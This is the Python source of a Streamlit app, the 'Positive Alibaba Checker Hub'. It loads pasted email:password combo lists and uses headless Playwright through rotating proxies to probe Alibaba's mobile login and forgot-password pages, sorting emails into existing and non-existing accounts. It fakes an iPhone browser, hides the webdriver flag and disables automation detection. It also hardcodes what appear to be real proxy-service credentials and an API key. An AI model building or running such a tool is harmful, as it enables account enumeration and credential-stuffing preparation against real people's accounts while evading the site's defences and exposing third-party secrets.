import streamlit as st
import asyncio
import os
import random
import uuid
import time
import requests
import json
import threading
import sys
import subprocess
from datetime import datetime
from collections import defaultdict
import pandas as pd
from playwright.async_api import async_playwright
import nest_asyncio

nest_asyncio.apply()

# Automatically install Playwright browser and all required system dependencies on startup
@st.cache_resource
def install_playwright_with_deps():
    try:
        subprocess.run([sys.executable, "-m", "playwright", "install", "--with-deps", "chromium"], check=True)
    except Exception as e:
        print(f"Playwright dependency install notice: {e}")

install_playwright_with_deps()

st.set_page_config(
    page_title="Positive Alibaba Checker Hub",
    page_icon="📦",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.title("📦 Positive Alibaba Checker Hub")
st.caption("Advanced automated Alibaba account existence checker powered by Playwright mobile automation and proxy health management.")

if "proxy_logs" not in st.session_state:
    st.session_state.proxy_logs = []
if "checker_logs" not in st.session_state:
    st.session_state.checker_logs = []
if "startup_entries" not in st.session_state:
    st.session_state.startup_entries = []
if "alibaba_results" not in st.session_state:
    st.session_state.alibaba_results = {"linked": [], "not_linked": [], "errors": []}
if "pool_mode" not in st.session_state:
    st.session_state.pool_mode = "all"
if "pool_locked" not in st.session_state:
    st.session_state.pool_locked = True
if "picked_countries" not in st.session_state:
    st.session_state.picked_countries = ["US"]
if "pool_pick" not in st.session_state:
    st.session_state.pool_pick = None

def log_startup(msg):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{timestamp}] [INIT/HOOD] {msg}"
    if entry not in st.session_state.startup_entries:
        st.session_state.startup_entries.append(entry)

log_startup("Alibaba Checker Hub initialized with Playwright v2.10 engine.")

def add_checker_log(msg: str):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{timestamp}] {msg}"
    st.session_state.checker_logs.append(entry)

def add_proxy_log(msg: str):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{timestamp}] {msg}"
    st.session_state.proxy_logs.append(entry)

def _secret_to_env(k, v):
    if v is None:
        return
    if isinstance(v, (list, tuple)):
        os.environ[str(k)] = "\n".join(str(x) for x in v if x is not None)
        return
    if isinstance(v, dict):
        return
    os.environ[str(k)] = str(v)

try:
    for k, v in st.secrets.items():
        _secret_to_env(k, v)
    log_startup("Successfully bridged Streamlit secrets to environment variables.")
except Exception as e:
    log_startup(f"WARNING: Failed to bridge secrets to environment: {e}")

def get_secrets_webshare_keys():
    if "WEBSHARE_KEYS" in st.secrets:
        raw = st.secrets["WEBSHARE_KEYS"]
        return [k.strip() for k in raw.strip().splitlines() if k.strip()]
    return ["ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo"]

def get_secrets_oxylabs_proxies():
    if "OXYLABS_BASE" in st.secrets:
        raw = st.secrets["OXYLABS_BASE"]
        return [p.strip() for p in raw.strip().splitlines() if p.strip()]
    return ["user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000"]

webshare_keys_env = get_secrets_webshare_keys()
oxylabs_proxies_env = get_secrets_oxylabs_proxies()

proxy_meta_file = "proxy_meta.json"
def load_proxy_meta():
    if os.path.exists(proxy_meta_file):
        try:
            with open(proxy_meta_file, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

proxy_meta = load_proxy_meta()
proxy_lock = threading.Lock()
file_write_lock = threading.Lock()

def save_proxy_meta():
    try:
        with file_write_lock:
            with proxy_lock:
                with open(proxy_meta_file, "w", encoding="utf-8") as f:
                    json.dump(proxy_meta, f, indent=2)
    except Exception as e:
        print(f"Failed to save proxy meta: {e}")

def load_proxies():
    proxy_file = "proxies.txt"
    if not os.path.exists(proxy_file) or os.path.getsize(proxy_file) == 0:
        default_seed = oxylabs_proxies_env[:]
        try:
            with file_write_lock:
                with open(proxy_file, "w", encoding="utf-8") as f:
                    f.write("\n".join(default_seed) + "\n")
        except Exception:
            pass
    try:
        with open(proxy_file, encoding="utf-8", errors="ignore") as f:
            raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        return raw_list if raw_list else oxylabs_proxies_env
    except Exception:
        return oxylabs_proxies_env

def parse_proxy(proxy_str):
    proxy_str = (proxy_str or "").strip()
    if not proxy_str:
        return None
    if "@" in proxy_str:
        return f"http://{proxy_str}"
    parts = proxy_str.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{proxy_str}"
    return None

def compute_real_score(success_count, fail_count, initial_latency_score=80):
    try:
        total = success_count + fail_count
        if total == 0:
            return initial_latency_score
        smoothed_success = success_count + 2
        smoothed_fail = fail_count + 1
        smoothed_total = smoothed_success + smoothed_fail
        success_rate = (smoothed_success / smoothed_total) * 100
        score = int(success_rate - (fail_count * 5))
        return max(0, min(100, score))
    except Exception:
        return initial_latency_score

def get_geo(proxy_str):
    proxy = parse_proxy(proxy_str)
    if not proxy:
        return "-", "-"
    try:
        r = requests.get("http://ip-api.com/json/", proxies={"http": proxy, "https": proxy}, timeout=5)
        data = r.json()
        return data.get("country", "-"), data.get("city", "-")
    except Exception:
        return "-", "-"

def test_proxy(proxy_str, timeout_sec=3):
    try:
        proxy = parse_proxy(proxy_str)
        if not proxy:
            return False, "Invalid proxy format", "Unknown", 0
        start_t = time.time()
        r = requests.get("https://api.ipify.org?format=json", proxies={"http": proxy, "https": proxy}, timeout=timeout_sec)
        latency = int((time.time() - start_t) * 1000)
        if r.status_code == 200:
            initial_score = max(0, min(100, 100 - int(latency / 15)))
            country, city = get_geo(proxy_str)
            with proxy_lock:
                if proxy_str not in proxy_meta:
                    proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country, "region": city, "latency_ms": latency}
                m = proxy_meta[proxy_str]
                m["success"] = m.get("success", 0) + 1
                m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0), initial_score)
                m["country"] = country
                m["region"] = city
                m["latency_ms"] = latency
            save_proxy_meta()
            return True, f"OK ({latency}ms)", country, proxy_meta[proxy_str]["score"]
        return False, f"HTTP Status {r.status_code}", "Unknown", 0
    except requests.exceptions.Timeout:
        return False, "Connection Timeout", "Unknown", 0
    except Exception as e:
        return False, str(e)[:30], "Unknown", 0

def load_webshare(api_keys):
    info, out = {}, []
    for api_key in api_keys:
        if not api_key.strip():
            continue
        try:
            headers = {"Authorization": f"Token {api_key.strip()}"}
            page = 1
            while page <= 10:
                url = f"https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page={page}&page_size=100"
                r = requests.get(url, headers=headers, timeout=15)
                if r.status_code != 200:
                    break
                data = r.json()
                items = data.get("results", [])
                if not items:
                    break
                for it in items:
                    try:
                        line = f"{it['username']}:{it['password']}@{it['proxy_address']}:{it['port']}"
                        out.append(line)
                        info[line] = (str(it.get("country_code") or "-"), str(it.get("city_name") or "-"))
                    except Exception:
                        continue
                if not data.get("next"):
                    break
                page += 1
        except Exception as e:
            add_proxy_log(f"Error fetching Webshare API key: {str(e)[:50]}")
            continue
    return list(dict.fromkeys(out)), info

def get_available_countries_with_scores():
    try:
        raw = load_proxies()
        country_scores = defaultdict(list)
        for p in raw:
            meta = proxy_meta.get(p, {})
            c = meta.get("country", "Unknown").upper()
            score = meta.get("score", 50)
            country_scores[c].append(score)
        avg_country_scores = [(c, sum(s)/len(s)) for c, s in country_scores.items() if c != "UNKNOWN"]
        avg_country_scores.sort(key=lambda x: x[1], reverse=True)
        return [item[0] for item in avg_country_scores] + ["US"]
    except Exception:
        return ["US", "GB", "DE"]

def get_filtered_active_proxies():
    raw = load_proxies()
    filtered = []
    min_score = st.session_state.get("min_proxy_score", 40)
    mode = st.session_state.get("pool_mode", "all")
    chosen = st.session_state.get("picked_countries", ["US"])
    
    for p in raw:
        meta = proxy_meta.get(p, {})
        score = meta.get("score", 50)
        country = meta.get("country", "Unknown").upper()
        if score < min_score:
            continue
        if mode == "all":
            filtered.append(p)
        elif mode == "us_only":
            if "US" in country or "UNITED STATES" in country or "-country-US" in p:
                filtered.append(p)
        elif mode in ("country", "mix"):
            if any(cc in country or cc in p.upper() for cc in chosen):
                filtered.append(p)
        else:
            filtered.append(p)
    return filtered if filtered else raw

st.sidebar.header("⚙️ Configuration Hub")
st.sidebar.markdown("### 🌐 Proxy Management & Health")
all_proxies_loaded = load_proxies()
filtered_proxy_pool = get_filtered_active_proxies()
st.sidebar.info(f"Loaded Proxies: {len(all_proxies_loaded)} | Filtered Pool: {len(filtered_proxy_pool)}")

min_proxy_score = st.sidebar.slider("Min Proxy Score", 0, 100, 40, key="min_proxy_score")
proxy_timeout = st.sidebar.slider("Proxy Pre-Check Timeout (Sec)", 1, 10, 3, key="proxy_timeout")

pool_mode = st.session_state.pool_mode
if st.session_state.pool_locked:
    st.sidebar.success(f"Pool set: {pool_mode}")
    if pool_mode in ("country", "mix"):
        st.sidebar.caption("Picked: " + ", ".join(st.session_state.picked_countries))
    if st.sidebar.button("Change pool"):
        st.session_state.pool_locked = False
        st.session_state.pool_pick = None
        st.rerun()
else:
    st.sidebar.caption("Tap pool mode:")
    col_p1, col_p2 = st.sidebar.columns(2)
    with col_p1:
        if st.sidebar.button("all", key="pool_btn_all"):
            st.session_state.pool_mode = "all"
            st.session_state.pool_locked = True
            st.session_state.pool_pick = None
            st.rerun()
        if st.sidebar.button("country", key="pool_btn_country"):
            st.session_state.pool_pick = "country"
            st.rerun()
    with col_p2:
        if st.sidebar.button("us_only", key="pool_btn_us"):
            st.session_state.pool_mode = "us_only"
            st.session_state.pool_locked = True
            st.session_state.pool_pick = None
            st.rerun()
        if st.sidebar.button("mix", key="pool_btn_mix"):
            st.session_state.pool_pick = "mix"
            st.rerun()
            
    choice = st.session_state.pool_pick
    if choice in ("country", "mix"):
        available_countries = get_available_countries_with_scores()
        with st.sidebar.form("pool_pick_form"):
            picked = []
            for c in available_countries:
                if st.checkbox(c, value=c in st.session_state.picked_countries, key=f"poolchk_{choice}_{c}"):
                    picked.append(c)
            if st.form_submit_button("Done"):
                if picked:
                    st.session_state.pool_mode = choice
                    st.session_state.picked_countries = picked
                    st.session_state.pool_locked = True
                    st.session_state.pool_pick = None
                    st.rerun()

with st.sidebar.expander("➕ Add Custom Proxies", expanded=False):
    custom_proxy_text = st.text_area("Paste proxies (user:pass@ip:port)", height=80)
    if st.button("Save Custom Proxies"):
        if custom_proxy_text.strip():
            new_p = [l.strip() for l in custom_proxy_text.splitlines() if l.strip()]
            existing = load_proxies()
            combined = list(dict.fromkeys(existing + new_p))
            with file_write_lock:
                with open("proxies.txt", "w", encoding="utf-8") as f:
                    f.write("\n".join(combined) + "\n")
            st.success(f"Added {len(new_p)} custom proxies!")
            st.rerun()

if st.sidebar.button("📥 Fetch & Test All Proxies"):
    st.session_state.proxy_logs = []
    with st.spinner("Fetching Webshare proxies & testing pool health..."):
        ws_list, api_info = load_webshare(webshare_keys_env)
        all_raw = list(dict.fromkeys(oxylabs_proxies_env + ws_list))
        live = []
        for idx, p in enumerate(all_raw, 1):
            short = p.split("@")[-1] if "@" in p else p
            is_alive, msg, country, score = test_proxy(p, timeout_sec=proxy_timeout)
            if is_alive:
                live.append(p)
                add_proxy_log(f"[{idx}/{len(all_raw)}] ✅ Alive → {short} | Country: {country} | Score: {score} | {msg}")
            else:
                add_proxy_log(f"[{idx}/{len(all_raw)}] ❌ Dead → {short} | Reason: {msg}")
        with file_write_lock:
            with open("proxies.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(live))
        st.success(f"Proxy test complete! Saved {len(live)} live proxies.")

max_workers = st.sidebar.slider("Worker Threads", 1, 10, 3)

st.sidebar.markdown("---")
st.sidebar.header("📋 Accounts Input")
accounts_input = st.sidebar.text_area(
    "Paste accounts (email:password)",
    value="example1@domain.com:password123\nexample2@domain.com:password456",
    height=120
)

st.markdown("---")
st.markdown("### 🖥️ Startup & Under-The-Hood Display Panel")
startup_expander = st.expander("🔍 View All Startup Entries", expanded=True)
with startup_expander:
    st.code("\n".join(st.session_state.startup_entries), language="text")

tab1, tab2, tab3 = st.tabs(["🌐 Proxy Manager", "🚀 Alibaba Checker", "📁 Results & Export"])

with tab1:
    st.subheader("Proxy Management & Health")
    if st.session_state.proxy_logs:
        st.code("\n".join(st.session_state.proxy_logs), language="text")
    else:
        st.info("Click 'Fetch & Test All Proxies' in the sidebar.")

with tab2:
    st.subheader("Alibaba Account Existence Checker Engine")
    accounts = [l.strip() for l in accounts_input.strip().splitlines() if l.strip() and ":" in l]
    st.info(f"Loaded **{len(accounts)}** valid account combos ready for checking.")

    if st.button("🚀 Start Alibaba Checker", type="primary"):
        if not accounts:
            st.warning("Please provide accounts in the sidebar first.")
        else:
            st.session_state.checker_logs = []
            add_checker_log(f"Initializing Playwright v2.10 Alibaba Checker engine with {len(accounts)} accounts across {max_workers} workers.")

            async def run_checker():
                LOGIN_URL = "https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&lang=en_US"
                proxy_file = "proxies.txt"
                alive_proxies_list = []
                if os.path.exists(proxy_file):
                    with open(proxy_file, encoding="utf-8") as f:
                        alive_proxies_list = [l.strip() for l in f if l.strip()]
                if not alive_proxies_list:
                    alive_proxies_list = oxylabs_proxies_env

                proxy_lock_async = asyncio.Lock()
                result_lock = asyncio.Lock()
                linked_accs, not_linked_accs, error_accs = [], [], []

                OXY_USER = "user-Positive_S79mq-country-US"
                OXY_PASS = "Kingfrosh5252+"
                OXY_HOST = "dc.oxylabs.io:8000"

                def make_oxylabs_proxy():
                    return f"{OXY_USER}-sessid-{uuid.uuid4().hex[:12]}:{OXY_PASS}@{OXY_HOST}"

                async def get_next_proxy():
                    async with proxy_lock_async:
                        if not alive_proxies_list:
                            return None
                        p = alive_proxies_list.pop(0)
                        alive_proxies_list.append(p)
                        if "oxylabs.io" in p:
                            return make_oxylabs_proxy()
                        return p

                def classify(url, text):
                    url, text = (url or "").lower(), (text or "").lower()
                    if ("verify_mode.htm" in url or "token_enter_iv.htm" in url or "iv_token=" in url or "/iv/" in url or "complete the verification" in text or "get code" in text):
                        return "linked", "Verification page"
                    if "account does not exist" in text or "please enter a valid email" in text:
                        return "not_linked", "Account does not exist"
                    if "captcha" in text or "blocked" in text:
                        return "error", "Captcha / blocked"
                    return None, None

                async def click_first(page, selectors):
                    for sel in selectors:
                        try:
                            loc = page.locator(sel)
                            if await loc.count() > 0:
                                await loc.first.click(timeout=6000)
                                return True
                        except:
                            continue
                    return False

                async def fill_first(page, selectors, value):
                    for sel in selectors:
                        try:
                            loc = page.locator(sel)
                            if await loc.count() > 0:
                                await loc.first.fill(value, timeout=6000)
                                return True
                        except:
                            continue
                    return False

                async def wait_for_result(page, max_wait=8.0):
                    end = time.time() + max_wait
                    last_url, last_text = page.url, ""
                    while time.time() < end:
                        try:
                            last_url = page.url
                            last_text = await page.inner_text("body")
                            status, detail = classify(last_url, last_text)
                            if status:
                                return status, detail
                        except:
                            pass
                        await asyncio.sleep(0.25)
                    if last_text:
                        status, detail = classify(last_url, last_text)
                        if status:
                            return status, detail
                        if "find_password.htm" in (last_url or "").lower():
                            return "not_linked", "Stayed on find password page"
                    return "error", f"Unknown → {(last_url or '')[:70]}"

                async def new_page(browser, raw_proxy):
                    parsed = parse_proxy(raw_proxy) if raw_proxy else None
                    args = {
                        "viewport": {"width": 390, "height": 844},
                        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
                        "is_mobile": True, "has_touch": True, "locale": "en-US",
                    }
                    if parsed:
                        args["proxy"] = {"server": parsed}
                    context = await browser.new_context(**args)
                    page = await context.new_page()
                    await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
                    return context, page

                async def check_on_page(page, email):
                    await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=35000)
                    await asyncio.sleep(1.0)
                    if not await click_first(page, ['text="Continue with email"', 'button:has-text("Continue with email")']):
                        return "error", "Could not click Continue with email"
                    await asyncio.sleep(1.0)
                    if not await fill_first(page, ['input[type="email"]', 'input[type="text"]', 'input'], email):
                        return "error", "Could not fill email"
                    if not await click_first(page, ['text="Forgot password?"', 'a:has-text("Forgot password")', 'text=/Forgot password/i']):
                        return "error", "Could not click Forgot password"
                    await asyncio.sleep(1.1)
                    return await wait_for_result(page, max_wait=8.0)

                async def worker(worker_id, browser, queue, total):
                    await asyncio.sleep(worker_id * 1.2)
                    raw_proxy = await get_next_proxy()
                    try:
                        context, page = await new_page(browser, raw_proxy)
                    except Exception:
                        context, page = await new_page(browser, None)
                        raw_proxy = None

                    while not queue.empty():
                        idx, line = await queue.get()
                        email = line.split(":", 1)[0].strip()
                        try:
                            status, detail = await check_on_page(page, email)
                        except Exception as e:
                            err = str(e)
                            if "Timeout" in err or "net::" in err or "ERR_" in err:
                                status, detail = "error", "Timeout / proxy failed"
                            else:
                                status, detail = "error", err[:80]
                            try:
                                await context.close()
                            except:
                                pass
                            raw_proxy = await get_next_proxy()
                            try:
                                context, page = await new_page(browser, raw_proxy)
                                status, detail = await check_on_page(page, email)
                            except Exception as ex:
                                status, detail = "error", str(ex)[:80]

                        icon = "✅" if status == "linked" else ("❌" if status == "not_linked" else "⚠️")
                        add_checker_log(f"[{idx}/{total}] {email} | Status: {icon} {status.upper()} | Detail: {detail}")

                        async with result_lock:
                            if status == "linked":
                                linked_accs.append(line)
                            elif status == "not_linked":
                                not_linked_accs.append(line)
                            else:
                                error_accs.append(f"{line} # {detail}")
                        queue.task_done()
                        await asyncio.sleep(random.uniform(0.8, 1.6))

                    try:
                        await context.close()
                    except:
                        pass

                async with async_playwright() as p:
                    add_checker_log("Launching Playwright Chromium instance...")
                    browser = await p.chromium.launch(
                        headless=True,
                        args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage", "--disable-gpu", "--disable-blink-features=AutomationControlled"]
                    )
                    queue = asyncio.Queue()
                    for idx, line in enumerate(accounts, 1):
                        await queue.put((idx, line))

                    workers = [asyncio.create_task(worker(i + 1, browser, queue, len(accounts))) for i in range(max_workers)]
                    await queue.join()
                    await asyncio.gather(*workers)
                    await browser.close()
                    add_checker_log("Playwright checking run completed successfully.")

                return {"linked": linked_accs, "not_linked": not_linked_accs, "errors": error_accs}

            try:
                loop = asyncio.get_event_loop()
                results = loop.run_until_complete(run_checker())
            except RuntimeError:
                results = asyncio.run(run_checker())

            st.session_state.alibaba_results = results
            st.success("Checker execution complete!")

    res = st.session_state.alibaba_results
    m1, m2, m3 = st.columns(3)
    m1.metric("✅ Linked Accounts", len(res["linked"]))
    m2.metric("❌ Not Linked", len(res["not_linked"]))
    m3.metric("⚠️ Errors", len(res["errors"]))

    with st.expander("🔍 Diagnostic Telemetry Logs", expanded=True):
        if st.session_state.checker_logs:
            st.code("\n".join(st.session_state.checker_logs), language="text")
        else:
            st.caption("Logs will appear here during execution.")

with tab3:
    st.subheader("Export Results")
    res = st.session_state.alibaba_results
    if res["linked"]:
        st.markdown("### Linked Accounts")
        st.code("\n".join(res["linked"]), language="text")
        st.download_button("Download Linked TXT", "\n".join(res["linked"]), file_name="linked_accounts.txt", mime="text/plain")
    if res["not_linked"]:
        st.markdown("### Not Linked Accounts")
        st.code("\n".join(res["not_linked"]), language="text")
        st.download_button("Download Not Linked TXT", "\n".join(res["not_linked"]), file_name="not_linked_accounts.txt", mime="text/plain")
    if res["errors"]:
        st.markdown("### Errors")
        st.code("\n".join(res["errors"]), language="text")
        st.download_button("Download Errors TXT", "\n".join(res["errors"]), file_name="error_accounts.txt", mime="text/plain")
